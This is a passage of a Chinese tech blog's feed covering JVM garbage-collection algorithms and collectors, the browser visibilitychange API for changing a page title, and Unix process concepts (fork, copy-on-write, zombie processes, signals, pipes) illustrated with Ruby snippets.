内存的分配担保也一样，如果另外一块Survivor空间没有足够空间存放上一次新生代收集下来的存活对象时，这些对象将直接通过分配担保机制进入老年代。</p><p>复制算法是针对标记—清除算法的缺点，在其基础上进行改进而得到的，它讲课用内存按容量分为大小相等的两块，每次只使用其中的一块，当这一块的内存用完了，就将还存活着的对象复制到另外一块内存上面，然后再把已使用过的内存空间一次清理掉。复制算法有如下优点：</p><ul>  <li>每次只对一块内存进行回收，运行高效。</li>  <li>只需移动栈顶指针，按顺序分配内存即可，实现简单。</li>  <li>内存回收时不用考虑内存碎片的出现。</li></ul><p>它的缺点是：可一次性分配的最大内存缩小了一半。</p><p><img src="http://www.meng.uno/images/gc/1.png" alt=""></p><p>这种算法虽然实现简单，运行高效且不容易产生内存碎片，但是却对内存空间的使用做出了高昂的代价，因为能够使用的内存缩减到原来的一半。</p><p>很显然，Copying算法的效率跟存活对象的数目多少有很大的关系，如果存活对象很多，那么Copying算法的效率将会大大降低。</p><p>我们首先一起来看一下复制算法的做法，复制算法将内存划分为两个区间，在任意时间点，所有动态分配的对象都只能分配在其中一个区间（称为活动区间），而另外一个区间（称为空闲区间）则是空闲的。</p><p>当有效内存空间耗尽时，JVM将暂停程序运行，开启复制算法GC线程。接下来GC线程会将活动区间内的存活对象，全部复制到空闲区间，且严格按照内存地址依次排列，与此同时，GC线程将更新存活对象的内存引用地址指向新的内存地址。</p><p>此时，空闲区间已经与活动区间交换，而垃圾对象现在已经全部留在了原来的活动区间，也就是现在的空闲区间。事实上，在活动区间转换为空间区间的同时，垃圾对象已经被一次性全部回收。</p><p>很明显，复制算法弥补了标记/清除算法中，内存布局混乱的缺点。不过与此同时，它的缺点也是相当明显的。</p><ol>  <li>它浪费了一半的内存，这太要命了。</li>  <li>如果对象的存活率很高，我们可以极端一点，假设是100%存活，那么我们需要将所有对象都复制一遍，并将所有引用地址重置一遍。复制这一工作所花费的时间，在对象存活率达到一定程度时，将会变的不可忽视。</li></ol><p>所以从以上描述不难看出，复制算法要想使用，最起码对象的存活率要非常低才行，而且最重要的是，我们必须要克服50%内存的浪费。</p><h3 id="mark-compact-标记-整理-算法">Mark-Compact（标记-整理）算法</h3><p>为了解决Copying算法的缺陷，充分利用内存空间，提出了Mark-Compact算法。该算法标记阶段和Mark-Sweep一样，但是在完成标记之后，它不是直接清理可回收对象，而是将存活对象都向一端移动，然后清理掉端边界以外的内存。</p><p>复制收集算法在对象存活率较高时就要进行较多的复制操作，效率将会变低。 更关键的是，如果不想浪费50%的空间，就需要有额外的空间进行分配担保，以应对被使用的内存中所有对象都100%存活的极端情况，所以在老年代一般不能直接选用这种算法。</p><p>根据老年代的特点，有人提出了另外一种“标记-整理”（Mark-Compact）算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。</p><p>标记/整理算法与标记/清除算法非常相似，它也是分为两个阶段：标记和整理。下面LZ给各位介绍一下这两个阶段都做了什么。</p><ul>  <li>标记：它的第一个阶段与标记/清除算法是一模一样的，均是遍历GC Roots，然后将存活的对象标记。</li>  <li>整理：移动所有存活的对象，且按照内存地址次序依次排列，然后将末端内存地址以后的内存全部回收。因此，第二阶段才称为整理阶段。</li></ul><p>复制算法比较适合于新生代，在老年代中，对象存活率比较高，如果执行较多的复制操作，效率将会变低，所以老年代一般会选用其他算法，如标记—整理算法。该算法标记的过程与标记—清除算法中的标记过程一样，但对标记后出的垃圾对象的处理情况有所不同，它不是直接对可回收对象进行清理，而是让所有的对象都向一端移动，然后直接清理掉端边界以外的内存。</p><p><img src="http://www.meng.uno/images/gc/2.png" alt=""></p><p>不难看出，标记/整理算法不仅可以弥补标记/清除算法当中，内存区域分散的缺点，也消除了复制算法当中，内存减半的高额代价，可谓是一举两得，一箭双雕，一石两鸟。</p><p>不过任何算法都会有其缺点，标记/整理算法唯一的缺点就是效率也不高，不仅要标记所有存活对象，还要整理所有存活对象的引用地址。从效率上来说，标记/整理算法要低于复制算法。</p><h3 id="generational-collection-分代收集-算法">Generational Collection（分代收集）算法</h3><p>分代收集算法是目前大部分JVM的垃圾收集器采用的算法。它的核心思想是根据对象存活的生命周期将内存划分为若干个不同的区域。一般情况下将堆区划分为老年代（Tenured Generation）和新生代（Young Generation），老年代的特点是每次垃圾收集时只有少量对象需要被回收，而新生代的特点是每次垃圾回收时都有大量的对象需要被回收，那么就可以根据不同代的特点采取最适合的收集算法。</p><p>目前大部分垃圾收集器对于新生代都采取Copying算法，因为新生代中每次垃圾回收都要回收大部分对象，也就是说需要复制的操作次数较少，但是实际中并不是按照1：1的比例来划分新生代的空间的。一般来说是将新生代划分为一块较大的Eden空间和两块较小的Survivor空间，每次使用Eden空间和其中的一块Survivor空间，当进行回收时，将Eden和Survivor中还存活的对象复制到另一块Survivor空间中，然后清理掉Eden和刚才使用过的Survivor空间。</p><p>而由于老年代的特点是每次回收都只回收少量对象，一般使用的是Mark-Compact算法。</p><p>注意，在堆区之外还有一个代就是永久代（Permanet Generation），它用来存储class类、常量、方法描述等。对永久代的回收主要回收两部分内容：废弃常量和无用的类。</p><p>当前商业虚拟机的垃圾收集 都采用分代收集，它根据对象的存活周期的不同将内存划分为几块，一般是把Java堆分为新生代和老年代。在新生代中，每次垃圾收集时都会发现有大量对象死去，只有少量存活，因此可选用复制算法来完成收集，而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用标记—清除算法或标记—整理算法来进行回收。</p><h2 id="典型的垃圾收集器">典型的垃圾收集器</h2><p>垃圾收集算法是 内存回收的理论基础，而垃圾收集器就是内存回收的具体实现。下面介绍一下HotSpot（JDK 7)虚拟机提供的几种垃圾收集器，用户可以根据自己的需求组合出各个年代使用的收集器。</p><ul>  <li>Serial/Serial Old</li></ul><p>Serial/Serial Old收集器是最基本最古老的收集器，它是一个单线程收集器，并且在它进行垃圾收集时，必须暂停所有用户线程。Serial收集器是针对新生代的收集器，采用的是Copying算法，Serial Old收集器是针对老年代的收集器，采用的是Mark-Compact算法。它的优点是实现简单高效，但是缺点是会给用户带来停顿。</p><ul>  <li>ParNew</li></ul><p>ParNew收集器是Serial收集器的多线程版本，使用多个线程进行垃圾收集。</p><ul>  <li>Parallel Scavenge</li></ul><p>Parallel Scavenge收集器是一个新生代的多线程收集器（并行收集器），它在回收期间不需要暂停其他用户线程，其采用的是Copying算法，该收集器与前两个收集器有所不同，它主要是为了达到一个可控的吞吐量。</p><ul>  <li>Parallel Old</li></ul><p>Parallel Old是Parallel Scavenge收集器的老年代版本（并行收集器），使用多线程和Mark-Compact算法。</p><ul>  <li>CMS</li></ul><p>CMS（Current Mark Sweep）收集器是一种以获取最短回收停顿时间为目标的收集器，它是一种并发收集器，采用的是Mark-Sweep算法。</p><ul>  <li>G1</li></ul><p>G1收集器是当今收集器技术发展最前沿的成果，它是一款面向服务端应用的收集器，它能充分利用多CPU、多核环境。因此它是一款并行与并发收集器，并且它能建立可预测的停顿时间模型。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/dde60b3a/">http://home.meng.uno/articles/dde60b3a/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      简介
Java GC（Garbage Collection，垃圾收集，垃圾回收）机制，是Java与C++/C的主要区别之一，作为Java开发者，一般不需要专门编写内存回收和垃圾清理代码，对内存泄露和溢出的问题，也不需要像C程序员那样战战兢兢。这是因为在Java虚拟机中，存在自动内存管理和垃圾清扫机制。概括地说，该机制对JVM（Java Virtual Machine）中的内存进行标记，并确定哪些内存需要回收，根据一定的回收策略，自动的回收内存，永不停息（Nerver Stop）的保证JVM中的内存空间，防止出现内存泄露和溢出问题。

关于JVM，需要说明一下的是，目前使用最多的Sun公司的JD
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="JVM" scheme="http://home.meng.uno/tags/JVM/"/>
    
      <category term="GC" scheme="http://home.meng.uno/tags/GC/"/>
    
      <category term="垃圾回收" scheme="http://home.meng.uno/tags/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"/>
    
  </entry>
  
  <entry>
    <title>H5网页失去焦点Title改变的方法</title>
    <link href="http://home.meng.uno/articles/7794c7e7/"/>
    <id>http://home.meng.uno/articles/7794c7e7/</id>
    <published>2018-03-08T06:33:11.000Z</published>
    <updated>2020-12-02T01:42:38.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>今天要讲的其实是一个API：<a href="https://developer.mozilla.org/zh-CN/docs/Web/Events/visibilitychange" target="_blank" rel="noopener">visibilitychange</a></p></blockquote><p>这个 API 本身非常简单，由以下三部分组成。</p><p>document.hidden：表示页面是否隐藏的布尔值。页面隐藏包括 页面在后台标签页中 或者 浏览器最小化 （注意，页面被其他软件遮盖并不算隐藏，比如打开的 sublime 遮住了浏览器）。</p><p>document.visibilityState：表示下面 4 个可能状态的值</p><ul>  <li>hidden：页面在后台标签页中或者浏览器最小化</li>  <li>visible：页面在前台标签页中</li>  <li>prerender：页面在屏幕外执行预渲染处理 document.hidden 的值为 true</li>  <li>unloaded：页面正在从内存中卸载</li></ul><p>Visibilitychange事件：当文档从可见变为不可见或者从不可见变为可见时，会触发该事件。</p><p>这样，我们可以监听 Visibilitychange 事件，当该事件触发时，获取 document.hidden 的值，根据该值进行页面一些事件的处理。</p><figure class="highlight html">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh-CN"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>这是原来的title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> tmptitle = <span class="built_in">document</span>.title;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.addEventListener(<span class="string">'visibilitychange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> isHidden = <span class="built_in">document</span>.hidden;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">if</span> (isHidden) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.title = <span class="string">'当焦点不在当前窗口时的网页标题'</span>;</span></span><br><span class="line"><span class="javascript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.title = tmptitle;</span></span><br><span class="line"><span class="undefined">          &#125;</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7794c7e7/">http://home.meng.uno/articles/7794c7e7/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      今天要讲的其实是一个API：visibilitychange

这个 API 本身非常简单，由以下三部分组成。

document.hidden：表示页面是否隐藏的布尔值。页面隐藏包括 页面在后台标签页中 或者 浏览器最小化 （注意，页面被其他软件遮盖并不算隐藏，比如打开的 sublime 遮住了浏览器）。

document.visibilityState：表示下面 4 个可能状态的值

 * hidden：页面在后台标签页中或者浏览器最小化
 * visible：页面在前台标签页中
 * prerender：页面在屏幕外执行预渲染处理 document.hidden 的值为 true
 *
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="H5" scheme="http://home.meng.uno/tags/H5/"/>
    
      <category term="Title" scheme="http://home.meng.uno/tags/Title/"/>
    
      <category term="焦点" scheme="http://home.meng.uno/tags/%E7%84%A6%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Unix进程的那些事</title>
    <link href="http://home.meng.uno/articles/aeaab565/"/>
    <id>http://home.meng.uno/articles/aeaab565/</id>
    <published>2018-03-04T12:06:22.000Z</published>
    <updated>2020-12-02T02:08:45.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>不知道你们有没有这样的疑惑，每次在看资料时遇到<code>fork(2)</code>，我都不理解，为什么<code>fork()</code>函数需要<code>2</code>做参数？还只能是<code>2</code>。</p></blockquote><blockquote>  <p>本篇博客在阅读了《Working with Unix Processes》之后总结而成。</p></blockquote><h1>回答疑问</h1><p>首先，我就来解释一下之前留下的那个疑问，用过Mac或者Linux的同学都知道电脑中有很多<code>man</code>文件夹，我也不知道怎么回事，莫非是因为我是个<code>man</code>？后来我知道了，<code>man</code>是<code>manpages</code>的意思，中文译作“Unix手册页”，和我们现实中使用的手册一样，这个手册也是分节的，其中比较重要的几节：</p><ul>  <li>节1：一般命令</li>  <li>节2：系统调用</li>  <li>节3：C库函数</li>  <li>节4：特殊文件</li></ul><p>那么我们该如何使用这个手册呢？</p><p>很简单 我们只需要：<code>man [节号] 命令名</code>就可以了。</p><p>例如：<code>man 2 fork</code></p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre>      </td>      <td class="code">        <pre><span class="line">     fork() will fail and no child process will be created <span class="keyword">if</span>:</span><br><span class="line"></span><br><span class="line">     [EAGAIN]           The system-imposed limit on the total number of processes under</span><br><span class="line">                        execution would be exceeded.  This limit is configuration-depen-</span><br><span class="line">                        dent.</span><br><span class="line"></span><br><span class="line">     [EAGAIN]           The system-imposed limit MAXUPRC (&lt;sys/param.h&gt;) on the total num-</span><br><span class="line">                        ber of processes under execution by <span class="selector-tag">a</span> single user would be</span><br><span class="line">                        exceeded.</span><br><span class="line"></span><br><span class="line">     [ENOMEM]           There is insufficient swap space <span class="keyword">for</span> the new process.</span><br><span class="line"></span><br><span class="line">LEGACY SYNOPSIS</span><br><span class="line">     <span class="selector-id">#include</span> &lt;sys/types.h&gt;</span><br><span class="line">     <span class="selector-id">#include</span> &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">     The include file &lt;sys/types.h&gt; is necessary.</span><br><span class="line"></span><br><span class="line">SEE ALSO</span><br><span class="line">     execve(<span class="number">2</span>), sigaction(<span class="number">2</span>), wait(<span class="number">2</span>), compat(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">HISTORY</span><br><span class="line">     A fork() function call appeared <span class="keyword">in</span> Version <span class="number">6</span> AT&amp;T UNIX.</span><br><span class="line"></span><br><span class="line">CAVEATS</span><br><span class="line">     There are limits to what you can do <span class="keyword">in</span> the child process.  To be totally safe you</span><br><span class="line">     should restrict yourself to only executing async-signal safe operations until such</span><br><span class="line">     <span class="selector-tag">time</span> as one of the exec functions is called.  All APIs, including global data sym-</span><br><span class="line">     bols, <span class="keyword">in</span> any framework or library should be assumed to be unsafe after <span class="selector-tag">a</span> fork()</span><br><span class="line">     unless explicitly documented to be safe or async-signal safe.  If you need to use</span><br><span class="line">     these frameworks <span class="keyword">in</span> the child process, you must exec.  In this situation it is rea-</span><br><span class="line">     sonable to exec yourself.</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>th Berkeley Distribution        June <span class="number">4</span>, <span class="number">1993</span>        <span class="number">4</span>th Berkeley Distribution</span><br><span class="line">(END)</span><br></pre>      </td>    </tr>  </table></figure><p>这就是完整的对fork(2)的解释。</p><h1>Unix进程</h1><h2 id="提示">提示</h2><p>所有<code>Ruby</code>代码皆需要在<code>irb</code>环境下运行，如何安装<code>Ruby</code>，可以百度。</p><h2 id="进程标识">进程标识</h2><p>每个人都有一个唯一的身份证号，进程也是如此，这个唯一的标识符叫做<code>pid</code>。我们输入：<code>puts Process.pid</code>就可以得到当前进程的pid了。</p><p>pid并不传达关于进程本身的任何信息，它仅仅是一个顺序标识符。在内核眼中进程只是一个数字而已。</p><p>pid是对进程的一种简单通用的描述，至于用途之一，比如我们常常会在日志文件中发现pid，当有多个进程向一个日志文件写入日志的时候，在每一行加入pid就可以知道哪一行日志是由哪个进程写入的。</p><h2 id="父进程">父进程</h2><p>系统中运行的每一个进程都有对应的父进程，每一个进程都知道其父进程的标识符(ppid)。多数情况下特定进程的父进程就是调用它的那个进程。比如启动终端并进入bash提示符，此时新创建的bash进程的父进程就是终端进程。如果在bash中调用ls等命令，那么bash进程便是ls进程的父进程。</p><p>父进程对于检测守护进程有比较重要的作用。</p><p>我们输入：<code>puts Process.ppid</code>就可以得到当前进程的父进程pid了。</p><h2 id="文件描述符">文件描述符</h2><p>我们讨论进程，怎么突然说道“文件”？其实，在Unix眼中，一切皆为“文件”！设备是文件，套接字是文件，文件也是文件。当然为了避免误解，一般将文件称为文件，其他称为资源。</p><p>我们使用这样的语句打印某“文件”的描述符：<code>puts 文件名.fileno</code>。</p><p>例如，STDIN的描述符：<code>puts STDIN.fileno</code>，结果是不是很吃惊？因为居然是<code>0</code>！！！</p><p>同理，排在其后的分别是STDOUT与STDERR，他们三者也被称为标准流。</p><h2 id="资源限制">资源限制</h2><p>文件描述符代表已经打开的资源，当资源没有被关闭时，该资源的文件描述符编号会一直被占用，文件描述符编号一直处于递增状态，而内核为每个进程设置了最大文件描述符号，即施加了一些资源限制。对于文件描述符编号的限制有软限制和硬限制。软限制一般可以比较小而硬限制一般数值比较大而且可以修改。如果超出限制则会报错。</p><p>资源限制除了允许打开的最大资源数以外，还包括可创建的最大文件长度和进程最大段的大小等。对于用户内核会限制其最大并发进程数。</p><p>我们使用<code>p Process.getrlimit(:NOFILE)</code>来获取当前进程的资源限制，在我的电脑上结果是：<code>[256, 9223372036854775807]</code>。</p><p>可能我们觉得软限制256有点少，那好，我们尝试给他设置一个大的。使用如下命令：</p><p><code>Process.setrlimit(:NOFILE,4096)</code></p><h2 id="环境变量">环境变量</h2><p>我们每个人都设置过环境变量，环境变量是包含进程数据的键值对。所有进程都从其父进程继承环境变量，它们由父进程设置并被子进程所继承。每一个进程都有环境变量，环境变量对于特定进程而言是全局性的。比如环境变量PWD对应的值为当前的工作目录等等。环境变量经常作为一种将输入传递到命令行程序中的方法。</p><h2 id="参数">参数</h2><p>所有进程都可以访问名为ARGV的特殊数组（<code>p ARGV</code>），它是一个参数向量或数组。保存了在命令行中传递给当前进程的参数。有些像C语言中main函数中第二个参数：char** argv。</p><h2 id="进程名">进程名</h2><p>系统中每一个进程都有名称，进程名可以在运行期间被修改并作为一种通信手段。一般都会有一个全局变量来存储当前进程的名称。可以通过给这个全局变量赋值来修改当前进程的名称。</p><p>我们可以用<code>puts $PROGRAM_NAME</code>来打印当前进程的进程名。</p><h2 id="退出码">退出码</h2><p>我们写C程序的时候，总是默认加上<code>return 0</code>，可能大家也遇到过其他的返回值，例如<code>exit(1)</code>等，这里的0、1就是退出码。</p><p>所有进程在退出时都带有数字退出码(0-255)用于指明进程是否顺利结束。一般退出码为0的进程被认为是顺利结束，其他的退出码则表明出现了错误，不同的退出码代表不同的错误。</p><p>尽管退出码通常用来表明不同的错误，它们其实是一种通信手段。作为程序员的你可以以适合自己程序的方式来处理各种进程退出码。</p><ul>  <li>exit</li></ul><p>默认进程退出码为<code>0</code>，可以传递指定的退出码。<code>exit 22</code>代表定制进程退出码为<code>22</code>，不指定数字则默认为<code>0</code>，而且指定退出码在<code>0-255</code>之间的数值才是有效的。</p><ul>  <li>exit!</li></ul><p>默认进程退出码为<code>1</code>，可以传递指定的退出码。<code>exit!33</code>代表定制进程退出码为<code>33</code>，不指定数字时默认为<code>1</code>，而且指定退出码在<code>0-255</code>之间的数值才是有效的。</p><ul>  <li>abort</li></ul><p>会将当前进程的退出码设置为<code>1</code>，而且可以传递一条消息给STDERR。例如<code>abort “Something went wrong!”</code>，则进程退出码为<code>1</code>且会在<code>STDERR</code>中打印<code>“Something went wrong”</code>。注意该方法不能指定退出码。</p><ul>  <li>raise</li></ul><p><code>raise</code>方法不会立即结束进程，它只是抛出一个异常，该异常会沿着调用栈向上传递并可能会得到处理。如果没有代码对其进程处理，那么这个未处理的异常将会终结该进程。类似于<code>abort</code>方法，一个未处理的异常会将退出码设置为<code>1</code>。也可以传递一条消息给<code>STDERR</code>。例如<code>raise “Something went wrong!”</code>，则进程退出码为<code>1</code>且会在<code>STDERR</code>中打印<code>“Something went wrong”</code>。<strong>注意该方法也不能指定退出码。</strong></p><h2 id="fork-与友好进程">fork()与友好进程</h2><p>fork()系统调用允许运行中的进程以编程的形式创建新的进程，这个心进程和原始进程一模一样。调用fork()的进程被称为父进程，新创建的进程被称为子进程。因子进程是一个全新的进程，所以它拥有自己唯一的进程id。</p><p>子进程从父进程处继承了其所占用内存中的所有内容，以及所有属于父进程的已打开的文件描述符的编号。这样，两个进程就可以共享打开的文件、套接字等。因子进程会复制父进程在内存中的所有内容，所以子进程可以随意更改其内存内容的副本，而不会对父进程造成任何影响(后面会介绍COW写时复制技术)。</p><p>对于fork()方法的一次调用实际上会返回两次。fork方法创造了一个新进程，在调用进程(父进程)中返回一次，且会返回子进程的pid；在新创建的进程(子进程)中又返回一次，返回0。</p><p>fork创建了一个和旧进程一模一样的新进程。所以试想一个使用了500MB内存的进程进行了衍生，那么就有1GB的内存被占用了。重复同样的操作十次，很快就会耗尽内存，这通常被称为“fork炸弹”。</p><p>所以现代的Unix/Linux操作系统采用写时复制(copy-on-write, COW)的方法来克服这个问题。COW将实际的内存复制操作推迟到了真正需要写入的时候。所以说父进程和子进程实际上是在共享内存中的数据，直到它们其中一个需要对数据进行修改，届时才会进行内存复制，使得两个进程保持适当的隔离。</p><p>这里多补充点COW的知识，自己在面试中也被问到这个问题，当时并不了解这个知识点，所以对这个知识点印象比较深刻。当采用COW技术时，子进程并不完全复制父进程的数据，只是以只读的方式共享父进程的页表，并将符进程的页表项也标记为只读。当父子进程中任何一个进程试图修改这些地址空间时，就会引发系统的页错误异常。异常错误处理程序将会生成该页的一份复制，并修改进程的页表项，指向新生成的页面，并将该页标记为已修改。</p><p>除了修改的数据和页面之外，其余的部分依然可以共享。</p><p>在一些语言当中，比如ruby中，会通过block代码块来使用fork。将一个block代码块传递给fork方法，那么这个block代码块将在新的子进程中执行，而父进程会跳过block中的内容。而且子进程执行完block之后就会退出，并不会像父进程那样指向随后的代码。</p><h2 id="孤儿进程">孤儿进程</h2><p>当父进程结束后而子进程没有结束时，子进程会照常继续运行，此时子进程被称为孤儿进程。孤儿进程会被系统当中的守护进程所收养，该进程是一种长期运行的进程，而且是有意作为孤儿进程存在。</p><h2 id="进程等待与僵尸进程">进程等待与僵尸进程</h2><p>wait是一个阻塞调用，该调用使得父进程一直等到它的某个子进程退出以后才继续执行。wait会返回其等待子进程的pid。wait2会返回两个值(pid, status)。除了pid之外还包括status，该变量存储有大量关于子进程的有用的信息，可让我们获知某个进程是怎样退出的。</p><p>wait/wait2是等待任意子进程的退出，而waitpid/waitpid2则是等待特定的由pid指定的子进程退出。</p><p>内核将退出的进程信息加入到队列，这样以来父进程就总是能够依照子进程退出的顺序接收到信息。就是说，即使子进程退出而父进程还没有准备妥当的时候，父进程也总能够通过队列获取到每个子进程的退出信息。注意，如果不存在子进程，调用wait的任一变体都会抛出ERRNO::ECHILD异常。所以最好让调用wait的数量和创建的子进程的数量相等才不会抛出异常。</p><p>一些服务器会使用看护进程这一模式：有一个衍生出多个并发子进程的进程，这个进程看管这些子进程，确保它们能够保持响应，并对子进程的退出做出响应，这个进程就是看护进程。</p><p>内核会将已退出的子进程的状态信息加入队列，所以即便父进程在子进程退出很久之后才调用wait，依然可以获取它的状态信息。内核会一直保留已退出的子进程的状态信息直到父进程调用wait请求这些消息。如果父进程一直不发出请求，那么状态信息就会被内核一直保留着，因此创建一个即发即弃的子进程却不去请求状态信息，便是在浪费内核资源，比如pid，要知道内核可创建的pid和进程控制块PCB是有限的，如果一直创建进程其父进程却不去请求它的退出信息，那么pid和PCB有可能会被耗尽而使得系统无法继续产生新进程。此时的子进程就被称为僵尸进程，所以说僵尸进程是有害的。</p><p>任何应结束的进程，如果它的状态信息一直未能读取，那么它就是一个僵尸进程，任何子进程在结束之时其父进程仍在运行，那么这个子进程很快就会称为僵尸进程。一旦父进程读取了僵尸进程的状态信息，那么它就不复存在，也就不再消耗内核资源。</p><p>有一种避免僵尸进程出现的方法就是分离父子进程，当父进程新创建一个子进程以后，如果不打算调用wait去等待和读取子进程的退出信息，可以使用detach方法。detach方法核心就是生成一个新线程，这个线程唯一的工作就是等待有pid所指定的那个进程退出并获取进程退出信息，从而确保内核不会一直保留进程的状态信息造成僵尸进程的出现和内核资源的浪费。</p><p>那么怎么识别僵尸进程呢？</p><p>很简答，我们使用如下指令：<code>pid = fork{ sleep 1} ; puts pid; sleep</code>的方式，发现结果为：<code>z</code>。</p><h2 id="信号量">信号量</h2><p>wait为父进程提供了一种很好方式来监管子进程。但它是一个阻塞调用：直到子进程结束，调用才会返回，任何一行代码都可能被信号中断。信号投递时不可靠的。如果你的代码正在处理CHLD信号，这时候另一个子进程结束了，那么你未必能收到第二个CHLD信号(CHLD信号：提醒父进程子进程退出的信号)。如果同一个信号在极短间隔内被多次收到，就会出现这种情况。这时可以考虑使用wait的非阻塞方法，形如<code>wait(-1, Process::WNOHANG)</code>。当获得一个信号并返回值以后就继续等待信号的产生。</p><p>信号是一种异步通信，当进程从内核接收到一个信号时，它可以执行下列某一个操作：</p><ul>  <li>忽略该信号；</li>  <li>执行特定操作；</li>  <li>执行默认操作。</li></ul><p>信号有内核发出，信号是由一个进程发送给另一个进程，不过内核作为中介而已。下表为常用信号介绍，大部分信号的默认行为都是终止进程，其中dump动作表示进程会立即结束并进行核心转储(栈跟踪)，而且比较特殊信号有SIGKILL和SIGSTOP信号不能被捕获、阻塞或忽略，SIGSR1和SIGSR2两个信号对应的操作由你的进程来定义。</p><p>信号是一个了不起的工具，不过捕获一个信号有点像使用全局变量，有可能把其他程序锁依赖的东西给修改了，不过和全局变量不同的是信号处理程序并没有命名空间。从最佳事件角度来说，个人代码不应该定义任何信号处理程序，除非它是服务器。正如一个从命令行启动的长期运行的进程，库代码极少会捕获信号。</p><p>进程可以在任何时候接收到信号，这就是信号的美所在！而且信号是异步的。有了信号，一旦知道了对方的pid，系统中的进程便可以彼此通信，使得信号成为一种极其强大的通信工具，常见的用法是使用kill方法来发送信号。实践当中，信号多是由长期运行的进程响应和使用，例如服务器和守护进程。而多数情况下，发送信号的都是人类用户而非自动化程序。</p><h2 id="进程通讯">进程通讯</h2><p>进程间通信(IPC)两个常见的实用方法是管道和套接字对(socket pairs)。</p><p>管道是一个单向数据流。打开一个管道，一个进程拥有管道的一段，另一个进程拥有另一端。然后数据就沿着管道单向传递。因此如果某个进程将自己作为一个管道的reader，而非writer，那么它就无法向管道中写入数据，反之亦然。例如在ruby脚本程序中：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>      </td>      <td class="code">        <pre><span class="line">reader，writer = IO.pipe</span><br><span class="line">writer.write(&quot;I am writing something..&quot;)</span><br><span class="line">writer.close</span><br><span class="line">puts reader.read</span><br></pre>      </td>    </tr>  </table></figure><p>结果为：</p><figure class="highlight plain">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">I am writing something..</span><br></pre>      </td>    </tr>  